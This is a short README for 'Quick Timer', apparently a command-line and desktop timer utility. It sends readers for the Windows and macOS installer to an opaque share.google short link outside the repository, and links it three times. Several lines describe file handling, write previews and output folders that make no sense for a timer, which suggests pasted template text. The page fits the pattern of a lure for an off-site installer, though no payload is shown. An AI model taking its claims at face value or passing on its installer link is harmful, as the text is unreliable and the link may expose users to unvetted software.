![Quick Timer](assets/hero.png)

# Quick Timer

*A timer that does not need a phone.*

## What Quick Timer is

This repository is **Quick Timer**, a desktop utility. A timer that does not need a phone.

A 15-minute task should not depend on a browser tab.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Minutes or seconds
- Desktop notice
- Optional sound
- Cancel with Ctrl+C

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/josephwatson09/quick-timer

MIT license. See `LICENSE`.
